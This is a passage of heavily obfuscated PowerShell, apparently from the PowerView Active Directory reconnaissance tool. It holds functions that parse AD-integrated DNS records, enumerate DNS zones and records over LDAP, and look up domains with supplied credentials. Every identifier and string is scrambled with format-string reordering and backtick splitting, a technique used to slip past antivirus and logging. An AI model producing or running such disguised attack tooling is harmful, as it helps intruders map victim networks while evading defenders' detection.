                ("{0}{1}" -f'Grou','p') {  (  &("{3}{2}{0}{1}"-f'ri','able','-Va','GEt')  ("59"+"J8"+"hu") -va )::"gR`oUp" }
                ("{1}{0}" -f 'ne','No') {  (  &("{0}{1}"-f 'dI','r') ("{2}{3}{1}{0}"-f 'hU',':59j8','va','rIaBle') )."VA`luE"::"No`NE" }
                ("{0}{1}"-f 'O','wner') {  ( &("{1}{2}{0}"-f'ablE','GE','t-vArI')  ("59J"+"8"+"HU") )."vA`lUE"::"Ow`NEr" }
                ("{1}{0}" -f'acl','S') {  ( &('gI')  ("{2}{3}{1}{0}" -f 'hu','8','Va','RIAbLe:59J')  )."Va`LuE"::"s`ACL" }
            }
        }

        if (${pSBOUN`DP`ArAMET`ERs}[("{1}{2}{0}" -f 'ies','P','ropert')]) {
            
            ${PROPE`RtI`EST`OLOad} = ${Pr`Op`erTi`es}| &("{2}{1}{0}{3}" -f'j','rEach-Ob','Fo','ect') { ${_}.("{1}{0}" -f 'plit','S').Invoke(',') }
            ${nu`LL} = ${s`EAR`CheR}."PROpEr`Ti`eSTOlO`Ad".("{0}{2}{1}"-f 'Add','e','Rang').Invoke((${P`RopERtI`eSt`oLOad}))
        }

        ${SeAR`C`HEr}
    }
}


function C`ONVerT-`dn`SR`EcOrD {


    [OutputType({"{2}{0}{1}{7}{4}{6}{3}{8}{5}"-f 'ystem.','Manag','S','omation.','t.A','ject','ut','emen','PSCustomOb'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItiON = 0, mANDAToRY = ${T`RuE}, ValueFROMpipELIneBYPRopeRTynaME = ${tr`Ue})]
        [Byte[]]
        ${DnsR`ec`o`RD}
    )

    BEGIN {
        function ge`T`-nAme {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{4}{2}" -f'O','SUse','ctly','P','utputTypeCorre'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`AW}
            )

            [Int]${l`en`gtH} = ${R`AW}[0]
            [Int]${SEGM`ENtS} = ${r`Aw}[1]
            [Int]${iND`eX} =  2
            [String]${N`AMe}  = ''

            while (${s`EGmEnTs}-- -gt 0)
            {
                [Int]${segmEN`T`Le`NGth} = ${r`Aw}[${i`Nd`Ex}++]
                while (${s`Eg`MeNTl`ENgth}-- -gt 0) {
                    ${Na`ME} += [Char]${R`AW}[${inD`ex}++]
                }
                ${n`AmE} += "."
            }
            ${na`me}
        }
    }

    PROCESS {
        
        ${RDATa`T`ypE} =   ${3`57}::("{0}{2}{1}"-f 'ToU','nt16','I').Invoke(${dN`sR`eCoRd}, 2)
        ${Up`D`Ate`dAtSE`RIaL} =   ( &("{1}{3}{2}{0}" -f 'M','chil','e','DiT') ("{0}{2}{1}"-f'vaRi','e:357','aBl') )."vA`LUe"::("{1}{0}" -f 'Int32','ToU').Invoke(${dN`sREc`ORD}, 8)

        ${tT`l`Raw} = ${d`Ns`R`ECORD}[12..15]

        
        ${n`UlL} =   ( &("{1}{0}"-f 't-ITEM','GE')  ("{0}{1}{2}" -f 'vaR','IabL','E:73bLj9'))."Val`Ue"::("{1}{2}{0}" -f'erse','R','ev').Invoke(${Tt`lR`Aw})
        ${t`TL} =   ${3`57}::("{1}{0}{2}" -f 'oUInt3','T','2').Invoke(${ttl`R`AW}, 0)

        ${A`Ge} =  ( &('gi') ("{0}{1}{2}{3}" -f'va','r','iAb','le:357') )."Va`LUE"::("{2}{0}{1}"-f'nt','32','ToUI').Invoke(${dnSRec`o`RD}, 20)
        if (${A`GE} -ne 0) {
            ${tiME`STA`mP} = ((&("{1}{0}{2}"-f 'Da','Get-','te') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{2}{1}{0}" -f 'dHours','d','A').Invoke(${a`Ge})).("{1}{0}{2}"-f 'in','ToStr','g').Invoke()
        }
        else {
            ${TI`mes`TAmp} = ("{0}{1}" -f'[static',']')
        }

        ${D`NsReco`R`DoBjEct} = &("{2}{0}{3}{1}" -f'w-','t','Ne','Objec') ("{0}{1}" -f 'PSObje','ct')

        if (${RdATA`T`Ype} -eq 1) {
            ${I`p} = "{0}.{1}.{2}.{3}" -f ${D`NSR`eco`Rd}[24], ${D`Nsr`eCORd}[25], ${d`NSrec`oRd}[26], ${Dns`R`eCORd}[27]
            ${D`ATa} = ${iP}
            ${D`N`SreC`ordoB`JecT} | &("{1}{0}{2}" -f'mb','Add-Me','er') ("{0}{2}{3}{1}" -f'Not','rty','eprop','e') ("{2}{0}{1}"-f 'cord','Type','Re') 'A'
        }

        elseif (${rDAt`A`Ty`pE} -eq 2) {
            ${nsn`AME} = &("{1}{0}"-f 'Name','Get-') ${DN`sr`ECOrD}[24..${DNs`REC`ORD}."LEng`TH"]
            ${d`ATA} = ${nSN`A`me}
            ${dn`s`REcOrdOb`jE`ct} | &("{0}{2}{1}" -f 'Add-','r','Membe') ("{2}{3}{0}{1}"-f 'ep','roperty','No','t') ("{3}{0}{1}{2}"-f'T','y','pe','Record') 'NS'
        }

        elseif (${r`da`TaTYPe} -eq 5) {
            ${a`L`ias} = &("{1}{0}"-f'Name','Get-') ${DNSr`E`cORd}[24..${dnsre`CO`RD}."LEN`Gth"]
            ${DA`TA} = ${al`Ias}
            ${dnsr`e`CoRDO`Bje`CT} | &("{2}{0}{1}"-f 'Mem','ber','Add-') ("{2}{0}{1}{3}"-f'epr','oper','Not','ty') ("{0}{2}{1}" -f 'Re','rdType','co') ("{1}{0}" -f 'ME','CNA')
        }

        elseif (${rDAt`ATY`pe} -eq 6) {
            
            ${Da`TA} = $( ( &("{1}{0}{2}"-f'iLdiT','CH','eM')  ("Va"+"RI"+"aB"+"lE:R"+"6EZph"))."VaL`Ue"::"toBa`SE6`4`sT`RiNG"(${dnsREC`o`Rd}[24..${DNS`R`ECord}."l`en`GTh"]))
            ${D`Nsr`ECOrDO`B`jeCt} | &("{1}{2}{0}{3}" -f'd-M','A','d','ember') ("{1}{0}{2}"-f'roper','Notep','ty') ("{2}{0}{1}" -f'e','cordType','R') 'SOA'
        }

        elseif (${RDAt`At`ypE} -eq 12) {
            ${p`TR} = &("{1}{2}{0}"-f'me','Ge','t-Na') ${dNS`Re`C`orD}[24..${D`NSRec`O`RD}."Len`gTh"]
            ${d`ATa} = ${p`TR}
            ${dNSr`e`COr`DOBjEcT} | &("{1}{2}{0}"-f'er','Add-Mem','b') ("{2}{0}{1}" -f 'otepropert','y','N') ("{2}{1}{0}"-f'dType','cor','Re') 'PTR'
        }

        elseif (${Rd`Ata`T`YPe} -eq 13) {
            
            ${DA`Ta} = $(  ${r`6EzPH}::"T`ObASE6`4`sTrING"(${D`NSre`c`oRd}[24..${DNsre`C`O`RD}."LEN`gTH"]))
            ${d`Ns`RECoRDobjeCt} | &("{1}{0}{2}{3}" -f'dd-','A','Mem','ber') ("{2}{0}{1}" -f 't','y','Noteproper') ("{3}{1}{2}{0}" -f 'e','ecor','dTyp','R') ("{1}{0}"-f'O','HINF')
        }

        elseif (${rdAtaT`Y`pE} -eq 15) {
            
            ${Da`Ta} = $( ${r6Ez`Ph}::"tob`ASe64S`TR`Ing"(${dN`SrE`cord}[24..${dN`sre`CoRD}."LeN`gTh"]))
            ${dnS`ReCord`Obj`E`cT} | &("{1}{2}{0}"-f 'r','A','dd-Membe') ("{0}{3}{1}{2}"-f'N','teprope','rty','o') ("{2}{1}{0}"-f 'rdType','o','Rec') 'MX'
        }

        elseif (${r`dA`TaTyPe} -eq 16) {
            [string]${t`XT}  = ''
            [int]${S`Egm`en`TlEngTh} = ${d`NS`RECoRD}[24]
            ${Ind`eX} = 25

            while (${s`eg`ME`Ntl`EngTh}-- -gt 0) {
                ${T`xT} += [char]${d`NsREc`ORD}[${IND`Ex}++]
            }

            ${d`AtA} = ${T`Xt}
            ${DNs`R`ec`Ordobj`eCT} | &("{2}{1}{0}"-f'ember','d-M','Ad') ("{3}{2}{1}{0}" -f'perty','epro','ot','N') ("{2}{1}{0}"-f'pe','dTy','Recor') 'TXT'
        }

        elseif (${rdaT`AT`yPE} -eq 28) {
            
            ${DA`TA} = $( (  &("{3}{1}{2}{0}" -f 'E','IAB','l','Get-Var') ("{0}{1}{2}"-f 'r','6Ez','pH') )."Va`lue"::"toB`AsE6`4`StRi`Ng"(${d`Ns`RE`CoRD}[24..${dNsR`Ec`ORd}."L`enGTH"]))
            ${D`NSRecor`doB`Ject} | &("{3}{1}{2}{0}"-f 'r','d-Me','mbe','Ad') ("{3}{1}{0}{2}" -f 'r','prope','ty','Note') ("{1}{2}{0}" -f'dType','Rec','or') ("{1}{0}" -f 'AA','AA')
        }

        elseif (${RDaT`A`T`YPE} -eq 33) {
            
            ${DA`Ta} = $( ${R6`E`zpH}::"TOBAsE`6`4ST`RInG"(${Dn`S`RecO`Rd}[24..${DNsR`E`COrD}."L`En`Gth"]))
            ${d`NsREC`or`dOB`jecT} | &("{0}{2}{1}" -f 'Add-M','r','embe') ("{3}{0}{1}{2}" -f'ote','prop','erty','N') ("{2}{0}{1}"-f 'eco','rdType','R') 'SRV'
        }

        else {
            ${dA`Ta} = $( (  &("{0}{2}{1}"-f 'gE','vARiABLe','t-') ("R6"+"ezpH"))."vAl`Ue"::"to`B`ASE`64ST`RInG"(${d`N`SRecOrD}[24..${d`Nsr`E`CorD}."L`e`NGtH"]))
            ${d`NSReco`RDo`BJEcT} | &("{1}{2}{0}{3}"-f'-M','Ad','d','ember') ("{1}{2}{0}{3}"-f 'o','N','otepr','perty') ("{1}{0}{2}"-f'cor','Re','dType') ("{2}{1}{0}" -f'N','W','UNKNO')
        }

        ${DNSrEco`R`DObJe`cT} | &("{2}{0}{1}"-f 'e','mber','Add-M') ("{2}{1}{0}" -f'operty','epr','Not') ("{1}{0}{2}{3}" -f'edAtS','Updat','eri','al') ${u`pd`ATeDaTSerial}
        ${DNsr`EC`Or`doBjE`cT} | &("{0}{2}{1}" -f'Add-Me','r','mbe') ("{0}{2}{1}"-f 'Notepr','y','opert') 'TTL' ${t`Tl}
        ${D`NsREC`ORdo`B`JEct} | &("{3}{1}{2}{0}" -f'r','Me','mbe','Add-') ("{0}{2}{1}{3}"-f'No','er','teprop','ty') 'Age' ${A`ge}
        ${d`NSrECO`RdO`Bject} | &("{0}{2}{1}"-f 'Add-Mem','r','be') ("{2}{0}{3}{1}" -f'o','erty','N','teprop') ("{1}{2}{0}"-f 'tamp','T','imeS') ${TiME`s`TaMp}
        ${dNSr`E`cO`RdObj`Ect} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{0}{1}{2}"-f'Not','epropert','y') ("{1}{0}"-f'ata','D') ${dA`TA}
        ${DNSreC`ord`O`B`jECT}
    }
}


function get-DO`MAi`NDNSZo`NE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}{4}" -f 'uldProc','SSh','P','o','ess'}, '')]
    [OutputType({"{3}{5}{1}{4}{2}{0}"-f 'e','erVie','NSZon','Po','w.D','w'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTiOn = 0, vAlUEfRomPIpeLine = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}{4}"-f 'rol','Cont','D','omain','ler'})]
        [String]
        ${sER`VEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${proper`T`I`ES},

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`SuLT`pA`Ges`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErvErtI`M`el`i`MiT},

        [Alias({"{0}{3}{2}{1}"-f'Ret','e','n','urnO'})]
        [Switch]
        ${f`iND`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EDenT`iaL} =   ${5R0`Vk}::"EM`ptY"
    )

    PROCESS {
        ${sE`ARChER`A`RGuM`En`TS} = @{
            ("{2}{1}{0}" -f'PFilter','A','LD') = (("{2}{0}{3}{4}{6}{5}{1}"-f'o','nsZone)','(','b','j','s=d','ectClas'))
        }
        if (${pS`Bo`UnD`PaRAmETERs}[("{1}{0}" -f'omain','D')]) { ${S`eArc`h`eRaRg`U`MEnTs}[("{1}{0}"-f 'ain','Dom')] = ${dom`A`IN} }
        if (${PS`BOU`N`d`PArAm`EtERs}[("{1}{0}"-f'er','Serv')]) { ${SEar`C`Her`ARG`UmEnTs}[("{0}{1}{2}"-f'S','er','ver')] = ${SErv`eR} }
        if (${P`SboUn`DPar`Amet`eRS}[("{3}{0}{1}{2}"-f'o','pertie','s','Pr')]) { ${Se`ARc`h`eraRgum`EN`TS}[("{1}{2}{0}" -f 's','Pro','pertie')] = ${Pr`opErTi`Es} }
        if (${pSBoU`Ndp`ARaM`eT`eRs}[("{3}{0}{1}{2}" -f 'esult','Page','Size','R')]) { ${SeARCheRAr`gu`M`EN`Ts}[("{3}{0}{2}{1}" -f'ultPa','e','geSiz','Res')] = ${r`esult`PAG`ESiZe} }
        if (${Psbou`NDpArA`M`EteRs}[("{4}{3}{1}{0}{2}"-f 'e','erTim','Limit','v','Ser')]) { ${Se`A`RchErar`gum`eN`Ts}[("{1}{0}{3}{2}"-f 'rTi','Serve','imit','meL')] = ${SeRV`e`Rt`IM`ElImIT} }
        if (${Psb`oU`NdPARam`eTERS}[("{2}{0}{1}" -f 'ede','ntial','Cr')]) { ${S`ea`RCHERArgUMEN`Ts}[("{0}{2}{1}"-f'C','ential','red')] = ${cred`eNt`ial} }
        ${Dns`sE`Arc`heR1} = &("{1}{2}{0}{3}"-f'e','Get-Domain','S','archer') @SearcherArguments

        if (${dNSS`Ear`cheR1}) {
            if (${pS`B`o`U`NDpaRAmETERs}[("{1}{0}"-f'ndOne','Fi')]) { ${R`Es`ULTs} = ${d`N`ss`EARCh`ER1}.("{0}{1}"-f 'FindO','ne').Invoke()  }
            else { ${R`e`sULts} = ${D`Nssea`RCh`Er1}.("{1}{0}"-f'ndAll','Fi').Invoke() }
            ${rEs`ULTS} | &("{2}{0}{1}" -f're-O','bject','Whe') {${_}} | &("{2}{0}{4}{3}{1}" -f'o','ect','F','-Obj','rEach') {
                ${O`UT} = &("{1}{4}{0}{3}{2}"-f'LDAPProp','Convert','y','ert','-') -Properties ${_}."PRO`pERtI`Es"
                ${o`Ut} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{1}{0}{2}"-f 'otePropert','N','y') ("{2}{1}{0}" -f'e','oneNam','Z') ${O`Ut}."na`ME"
                ${O`UT}."PS`oBjEcT"."t`yPenAMes".("{1}{0}"-f 'nsert','I').Invoke(0, ("{3}{0}{2}{1}" -f 'iew','Zone','.DNS','PowerV'))
                ${o`Ut}
            }

            if (${R`esULts}) {
                try { ${Re`SULts}.("{2}{0}{1}" -f'ispos','e','d').Invoke() }
                catch {
                    &("{1}{2}{0}{3}" -f 'te-V','Wr','i','erbose') ('[Get-Dom'+'ain'+'DFSSh'+'ar'+'e'+'] '+'Err'+'o'+'r '+'dis'+'posi'+'ng'+' '+'of'+' '+'the'+' '+'Resul'+'ts '+'o'+'b'+'ject: '+"$_")
                }
            }
            ${dN`SSe`Ar`chEr1}.("{1}{0}"-f'se','dispo').Invoke()
        }

        ${SEarc`her`ARg`U`MEnts}[("{3}{0}{1}{2}" -f 'earchB','asePr','efix','S')] = ("{0}{2}{3}{1}{5}{4}"-f'C','=Domain','N','=MicrosoftDNS,DC','nes','DnsZo')
        ${d`Nsse`A`RCheR2} = &("{1}{0}{5}{4}{3}{2}"-f 'et-D','G','r','earche','nS','omai') @SearcherArguments

        if (${DNSSeAr`c`h`eR2}) {
            try {
                if (${psboU`NdPa`RaME`T`eRS}[("{2}{0}{1}" -f 'dO','ne','Fin')]) { ${R`ESu`LTs} = ${d`NSSe`A`R`ChER2}.("{1}{0}" -f 'e','FindOn').Invoke() }
                else { ${rEs`UL`Ts} = ${dNSS`eARCHe`R2}.("{1}{0}"-f'indAll','F').Invoke() }
                ${R`esuL`Ts} | &("{1}{3}{0}{2}" -f 'e-Ob','Whe','ject','r') {${_}} | &("{2}{3}{1}{4}{0}" -f'bject','h','For','Eac','-O') {
                    ${o`UT} = &("{1}{0}{2}{3}{4}" -f'e','Conv','rt-L','DAPPr','operty') -Properties ${_}."pr`op`ERtIeS"
                    ${o`UT} | &("{1}{2}{0}"-f 'r','Add-Mem','be') ("{2}{0}{1}" -f'teProper','ty','No') ("{1}{0}"-f'ame','ZoneN') ${O`Ut}."Na`ME"
                    ${o`UT}."pS`ObJe`Ct"."TyPENa`MeS".("{0}{1}"-f'Inser','t').Invoke(0, ("{2}{1}{0}{3}{4}" -f'SZ','iew.DN','PowerV','on','e'))
                    ${o`UT}
                }
                if (${r`EsulTS}) {
                    try { ${r`e`SulTS}.("{0}{1}{2}" -f'd','isp','ose').Invoke() }
                    catch {
                        &("{2}{1}{3}{0}" -f'rbose','-','Write','Ve') ('[Get-'+'Do'+'mainDNSZo'+'ne]'+' '+'Err'+'or '+'d'+'is'+'p'+'osing '+'o'+'f '+'th'+'e '+'Res'+'u'+'lts '+'obj'+'ect: '+"$_")
                    }
                }
            }
            catch {
                &("{2}{0}{1}{3}" -f'er','bo','Write-V','se') ((("{0}{8}{15}{14}{13}{5}{11}{10}{1}{2}{16}{6}{9}{3}{4}{18}{17}{12}{7}{19}"-f'[','icros','oftD','a','in','or accessing {0}CN',',D','0','Get-','C=Dom','M','=','nes{','one] Err','nDNSZ','Domai','NS','o','DnsZ','}'))  -f [CHaR]39)
            }
            ${dN`s`SE`ARC`HeR2}.("{2}{0}{1}"-f 'sp','ose','di').Invoke()
        }
    }
}


function gET`-doMAI`NDN`sREc`ord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}"-f 's','oces','r','uldP','PSSho'}, '')]
    [OutputType({"{3}{2}{1}{0}"-f 'd','ecor','.DNSR','PowerView'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITIOn = 0,  mAndaTorY = ${T`Rue}, VaLueFrompIPELinE = ${T`RUE}, vALuefromPIPeLINEbyPROPeRtYNamE = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${zOne`N`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{4}{2}" -f 'Domai','C','ntroller','n','o'})]
        [String]
        ${Se`Rv`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`O`Per`TIeS} = ("{8}{10}{5}{9}{11}{1}{0}{2}{3}{6}{7}{4}"-f'o',',dnsrec','rd,','whe','reated,whenchanged','me,dist','n','c','n','inguishednam','a','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSUltP`AGesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ervERTI`ME`l`IMIT},

        [Alias({"{1}{2}{0}"-f 'e','Re','turnOn'})]
        [Switch]
        ${fi`NdoNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EdenT`iAL} =   ( &("{0}{1}"-f'i','TeM') ("{2}{0}{3}{1}" -f 'BL','0vK','VarIa','e:5R') )."vAl`Ue"::"em`PtY"
    )

    PROCESS {
        ${sEa`RcHEr`Ar`g`UMENts} = @{
            ("{2}{0}{1}"-f'Fi','lter','LDAP') = (("{5}{0}{1}{2}{3}{4}"-f 'ec','tC','l','a','ss=dnsNode)','(obj'))
            ("{0}{3}{1}{4}{2}" -f'S','rchBase','ix','ea','Pref') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${psb`OuN`DpARAME`T`eRs}[("{1}{0}"-f 'in','Doma')]) { ${SearcH`E`RArG`UmEN`TS}[("{1}{0}"-f 'ain','Dom')] = ${DOM`AiN} }
        if (${PsbOun`DP`AR`Ameters}[("{0}{1}" -f 'Serve','r')]) { ${S`EA`RCh`ERaR`GUMeNTS}[("{0}{1}" -f'S','erver')] = ${S`ErV`Er} }
        if (${P`SB`O`UnDpa`RAm`EteRs}[("{1}{2}{0}"-f 'ies','Proper','t')]) { ${SE`ArcHERAr`g`UMEn`Ts}[("{0}{1}{2}"-f 'Pr','operti','es')] = ${P`Rop`eRTIES} }
        if (${psBOU`N`DParA`m`etERS}[("{4}{3}{2}{0}{1}" -f 'S','ize','ge','Pa','Result')]) { ${seA`RCHeRarG`U`mE`NTS}[("{2}{0}{4}{3}{1}" -f'esu','e','R','iz','ltPageS')] = ${Res`UL`T`PaGESiZe} }
        if (${PS`BOunDpaR`A`M`ET`ERs}[("{3}{2}{1}{0}" -f'mit','meLi','i','ServerT')]) { ${S`Ea`RChe`R`ArguMe`Nts}[("{3}{2}{1}{0}" -f 'it','Lim','ime','ServerT')] = ${SEr`V`ErtiMeLi`m`iT} }
        if (${P`sBouNDpARAM`E`TE`RS}[("{0}{1}{2}"-f'Cre','denti','al')]) { ${s`earcH`er`AR`GumE`NtS}[("{2}{1}{0}" -f'ial','t','Creden')] = ${C`RED`EN`Tial} }
        ${d`NSSeA`RCHEr} = &("{4}{1}{0}{3}{2}" -f 'ainSear','om','her','c','Get-D') @SearcherArguments

        if (${D`NSS`EARC`hEr}) {
            if (${p`sbOU`ND`PARaME`TERs}[("{1}{0}{2}"-f 'd','Fin','One')]) { ${resu`L`TS} = ${dNsseA`R`C`HeR}.("{2}{1}{0}" -f 'One','d','Fin').Invoke() }
            else { ${RES`UltS} = ${dnSS`eArch`eR}.("{1}{2}{0}" -f 'l','Fi','ndAl').Invoke() }
            ${r`es`UltS} | &("{1}{3}{2}{0}"-f 'ct','Wher','-Obje','e') {${_}} | &("{0}{2}{1}{3}" -f'Fo','ch-','rEa','Object') {
                try {
                    ${O`UT} = &("{0}{2}{1}{3}"-f'Co','PPro','nvert-LDA','perty') -Properties ${_}."P`R`Ope`RTIEs" | &("{0}{1}{4}{2}{3}" -f'S','elec','bjec','t','t-O') ("{1}{0}"-f'e','nam'),("{1}{0}{3}{2}{4}" -f 'ingui','dist','h','s','edname'),("{2}{0}{1}"-f 'sr','ecord','dn'),("{2}{3}{1}{0}"-f'd','ate','wh','encre'),("{2}{0}{1}" -f 'h','anged','whenc')
                    ${o`Ut} | &("{0}{2}{1}"-f 'Add','ber','-Mem') ("{2}{0}{1}"-f'rope','rty','NoteP') ("{1}{0}{2}" -f'ne','Zo','Name') ${zO`NENA`mE}

                    
                    if (${o`UT}."dn`S`RECORD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${Re`c`orD} = &("{2}{0}{3}{4}{1}" -f'nve','ecord','Co','rt-','DNSR') -DNSRecord ${O`Ut}."DN`SReC`ORD"[0]
                    }
                    else {
                        ${RE`CoRd} = &("{3}{5}{0}{2}{4}{1}" -f'rt','cord','-DNS','C','Re','onve') -DNSRecord ${o`UT}."dNSr`eCo`Rd"
                    }

                    if (${rE`CO`RD}) {
                        ${Reco`Rd}."PsOb`JeCt"."Pro`pER`TiEs" | &("{0}{3}{2}{1}"-f 'For','h-Object','ac','E') {
                            ${o`UT} | &("{2}{1}{0}" -f 'er','d-Memb','Ad') ("{0}{2}{1}{3}" -f 'N','t','o','eProperty') ${_}."n`AME" ${_}."VA`lUe"
                        }
                    }

                    ${O`Ut}."P`sObJE`CT"."typE`NAMeS".("{1}{2}{0}" -f't','Ins','er').Invoke(0, ("{2}{3}{5}{4}{1}{0}" -f 'ord','Rec','P','ower','NS','View.D'))
                    ${O`Ut}
                }
                catch {
                    &("{2}{0}{4}{1}{3}" -f'ite-Wa','n','Wr','g','rni') ('[Get-Do'+'ma'+'inDNSReco'+'rd] '+'Er'+'r'+'or: '+"$_")
                    ${O`Ut}
                }
            }

            if (${r`ESULTS}) {
                try { ${R`esUL`Ts}.("{1}{2}{0}"-f'se','d','ispo').Invoke() }
                catch {
                    &("{0}{1}{2}{3}" -f 'Writ','e-V','erbo','se') ('[Ge'+'t-Do'+'mainD'+'NSRe'+'cord] '+'E'+'r'+'ror '+'dis'+'posin'+'g '+'o'+'f '+'the'+' '+'Resu'+'lts '+'ob'+'ject:'+' '+"$_")
                }
            }
            ${dnss`EA`RcH`er}.("{1}{0}{2}"-f 'i','d','spose').Invoke()
        }
    }
}


function gE`T-do`MAIN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(POSItIOn = 0, VAluEfrOMpipelIne = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${doma`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedeN`T`IaL} =  ${5R0`VK}::"E`MpTY"
    )

    PROCESS {
        if (${p`S`B`OU`Ndp`ArAMeters}[("{0}{3}{1}{2}"-f'Cr','denti','al','e')]) {

            &("{0}{3}{2}{1}" -f'Write-Ve','se','o','rb') ("{9}{6}{2}{13}{3}{10}{4}{5}{1}{8}{7}{12}{11}{0}" -f'n','nate cre','m','n] Us','g a','lter','t-Do',' ','dentials','[Ge','in','mai','for Get-Do','ai')

            if (${PS`BoU`Ndpar`AMEt`erS}[("{1}{0}" -f 'ain','Dom')]) {
                ${ta`R`getd`omaIN} = ${Dom`Ain}
            }
            else {
                
                ${TAR`gETD`OMAiN} = ${Cre`d`eNti`AL}.("{4}{3}{0}{2}{1}" -f'tw','al','orkCredenti','Ne','Get').Invoke()."D`OmaiN"
                &("{0}{2}{3}{1}"-f'Writ','se','e-Ver','bo') ('[Get-'+'Do'+'mai'+'n'+'] '+'Extr'+'acte'+'d '+'d'+'oma'+'in '+"'$TargetDomain' "+'fro'+'m '+'-C'+'re'+'dential')
            }

            ${Do`mai`NconTE`XT} = &("{2}{0}{1}" -f 'e','ct','New-Obj') ("{11}{13}{4}{8}{3}{12}{1}{0}{7}{2}{6}{9}{10}{5}"-f'ct','iveDire','rec','s','ry','t','t','ory.Di','Service','oryConte','x','System.Dir','.Act','ecto')(("{0}{1}" -f'Do','main'), ${Ta`R`GeT`DOMAin}, ${Cred`E`Nt`iaL}."us`eRnAME", ${CREDe`N`TiAL}.("{0}{2}{4}{3}{1}" -f 'GetNetworkCre','al','de','ti','n').Invoke()."PasSw`o`Rd")

            try {
                  ( &("{2}{0}{1}" -f'ia','BlE','geT-vAr')  ("{0}{1}" -f'j','at')  )."v`ALuE"::("{1}{0}{2}" -f 'oma','GetD','in').Invoke(${d`OMa`iNc`OntEXT})
            }
            catch {
                &("{1}{0}{2}{3}" -f'e-Verbo','Writ','s','e') ('[Get-Dom'+'a'+'in] '+'Th'+'e '+'spec'+'i'+'fi'+'ed '+'d'+'om'+'ain '+"'$TargetDomain' "+'does'+' '+'no'+'t '+'ex'+'ist, '+'co'+'u'+'ld '+'no'+'t '+'be'+' '+'c'+'ont'+'acted, '+'t'+'here '+('isnwIZt ')."REp`LAce"(([cHAr]119+[cHAr]73+[cHAr]90),[sTRiNG][cHAr]39)+'an'+' '+'existing'+' '+'tr'+'ust, '+'o'+'r '+'the'+' '+'sp'+'ecif'+'ied '+'c'+'rede'+'ntials '+'a'+'re '+'invali'+'d'+': '+"$_")
            }
        }
        elseif (${pS`BoUND`PArA`mE`TErs}[("{1}{0}" -f'ain','Dom')]) {
            ${DOmain`cO`NTE`xt} = &("{1}{3}{2}{0}" -f'bject','Ne','O','w-') ("{3}{6}{0}{2}{4}{7}{11}{5}{9}{1}{10}{8}"-f '.D','ryCont','irecto','Sy','rySe','.ActiveDirecto','stem','rvic','t','ry.Directo','ex','es')(("{2}{1}{0}"-f'n','ai','Dom'), ${D`o`MaIN})
            try {
                 (  &("{2}{0}{1}" -f'RiAbL','e','gEt-va')  ("{1}{0}" -f'at','J'))."VA`lue"::("{0}{1}{2}" -f'Get','D','omain').Invoke(${D`o`MaiNc`oNtExt})
            }
            catch {
                &("{2}{1}{0}{3}" -f '-Verbos','te','Wri','e') ('[Ge'+'t-Domain'+'] '+'T'+'he '+'sp'+'ecif'+'ied'+' '+'domai'+'n'+' '+"'$Domain' "+'do'+'es '+'n'+'ot '+'exi'+'st,'+' '+'coul'+'d '+'n'+'ot '+'b'+'e '+'co'+'nt'+'acted, '+'or'+' '+'th'+'ere '+('isn'+'{0'+'}t ')  -f  [CHAR]39+'a'+'n '+'exi'+'s'+'ting '+'t'+'ru'+'st '+': '+"$_")
            }
        }
        else {
            try {
                 ( &("{0}{1}{3}{2}" -f'G','eT-VAR','e','iABl') ("{0}{1}" -f'j','AT')  -VAL  )::("{1}{0}{2}{3}" -f'en','GetCurr','tDom','ain').Invoke()
            }
            catch {
                &("{0}{2}{1}"-f 'Wri','Verbose','te-') ('['+'Get'+'-Domain] '+'Er'+'ror '+'r'+'etrievin'+'g '+'the'+' '+'current'+' '+'d'+'omai'+'n: '+"$_")
            }
        }
    }
}


function gEt-Do`MA`inCOnT`R`olLer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f'rocess','S','ShouldP','P'}, '')]
    [OutputType({"{1}{2}{0}{3}" -f '.Comput','Pow','erView','er'})]
    [OutputType({"{14}{4}{8}{10}{12}{7}{9}{5}{2}{6}{1}{17}{3}{16}{0}{11}{15}{13}" -f 'ntr','.','eDirect','nC','stem.Direc','tiv','ory','s.A','to','c','ryServi','o','ce','er','Sy','ll','o','Domai'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitIon = 0, VALuEfrOMpiPEliNe = ${t`RUE})]
        [String]
        ${DO`MAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{5}{1}{4}{0}{2}"-f 'nt','ma','roller','D','inCo','o'})]
        [String]
        ${seR`VeR},

        [Switch]
        ${ld`Ap},

        [Management.Automation.PSCredential]
